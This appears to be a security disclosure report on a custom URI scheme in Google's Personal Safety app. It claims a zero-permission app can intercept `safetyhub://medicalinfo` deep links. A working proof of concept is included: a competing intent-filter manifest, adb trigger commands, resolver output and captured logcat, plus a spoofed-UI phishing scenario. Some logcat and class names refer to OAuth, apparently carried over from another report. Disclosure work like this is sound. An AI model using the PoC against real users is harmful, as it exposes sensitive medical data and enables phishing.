# Google Personal Safety (Safety Hub) — Medical Info Deep Link Interception via Unverified `safetyhub://` Custom URI Scheme

## Summary

Google Personal Safety (`com.google.android.apps.safetyhub`) registers a BROWSABLE intent filter for the custom URI scheme `safetyhub://medicalinfo` without App Link verification. This activity is the entry point to the app's **Medical Info** feature (emergency medical information: conditions, allergies, medications, blood type, organ donor status, emergency contacts). A zero-permission attacker app can register a competing intent filter for the same scheme, causing Android to display a disambiguation chooser (or, when only one app besides the sender is a candidate, a single-app "Open with" confirmation dialog) whenever `safetyhub://medicalinfo` is invoked. If the user confirms the attacker app, any query parameters carried on the URI are captured by the attacker.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must confirm/select the attacker app from the system chooser
- **CIA impact**: Confidentiality (medical-info deep link parameters intercepted by a zero-permission attacker; navigation to the medical info screen can be hijacked)

## Affected Components

- **Package**: `com.google.android.apps.safetyhub` (Personal Safety / Safety Hub)
- **Activity**: `com.google.android.apps.safetyhub.medicalinfo.ui.MedicalInfoSettings`
- **Scheme**: `safetyhub://medicalinfo`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="safetyhub" android:host="medicalinfo" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on this filter.** Because `safetyhub://` is a custom scheme (not `https://`), Android App Link (Digital Asset Links) verification cannot apply, so any app can freely claim the scheme.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with a competing intent filter:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="safetyhub" android:host="medicalinfo" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Confirm both apps register as candidates for the scheme:
   ```
   $ adb shell dumpsys package resolver | grep -A2 safetyhub:
   safetyhub:
     com.google.android.apps.safetyhub/.medicalinfo.ui.MedicalInfoSettings
     com.vrp.zeroperm/.OAuthInterceptActivity
   ```
3. Trigger the deep link (as any app, or a web page, could):
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "safetyhub://medicalinfo?patient_id=P12345"
   ```
4. Android displays the "Open with" chooser/confirmation showing **ZeroPerm** alongside **Personal Safety**.
5. If the user selects ZeroPerm, the full URI and all query parameters are captured by the zero-permission app.

### Runtime Proof

Foreground activity at the moment of the intent (confirms the chooser is actually shown, not silently routed to Safety Hub):

```
topResumedActivity=ActivityRecord{... android/com.android.internal.app.ResolverActivity ...}
Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=safetyhub://medicalinfo?patient_id=P12345 ... }
```

logcat after selecting ZeroPerm:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: safetyhub://medicalinfo?patient_id=P12345
W OAUTH_INTERCEPT: [+] Param: patient_id = P12345
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Impact

### Confidentiality
- **Medical-info deep link hijack**: Any parameter passed to `safetyhub://medicalinfo` (e.g. patient/record identifiers, deep-link state used to jump to a specific medical field) is exposed to a zero-permission attacker.
- **Navigation/state interception**: The attacker learns that the user (or an app acting on the user's behalf) is attempting to view or edit emergency medical information, which itself is sensitive metadata (health status signal).

### Integrity
- **Feature hijack**: Selecting the attacker app prevents Safety Hub from opening, so the user does not reach the intended medical-info screen — the attacker can instead present a spoofed UI mimicking Personal Safety to phish further medical details directly from the user.

## Attack Scenario

1. A companion app, widget, notification action, or QR code links out via `safetyhub://medicalinfo?...` to deep-link a user straight to their medical info (e.g. from an emergency-preparedness flow).
2. The attacker's zero-permission app is already installed (e.g., bundled as a free utility/game).
3. The chooser/confirmation dialog appears; if the user selects (or is tricked into selecting) ZeroPerm, the deep-link parameters are exfiltrated and the user is shown a spoofed "Personal Safety" UI instead of the real app.

## Recommended Fix

1. Migrate `safetyhub://medicalinfo` to a verified `https://` App Link with `autoVerify="true"` and a Digital Asset Links JSON on a Google-controlled domain.
2. Validate the caller with `Activity.getCallingPackage()` before acting on the intent, if the custom scheme must be retained for backward compatibility.
3. Remove the `BROWSABLE` category if this entry point is not meant to be reachable from arbitrary external senders.

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.54)
- `screen_safetyhub_chooser.png` — Chooser/confirmation dialog showing ZeroPerm as a candidate for `safetyhub://medicalinfo`
- `screen_safetyhub_data_capture.png` — ZeroPerm displaying the captured `safetyhub://` URI data
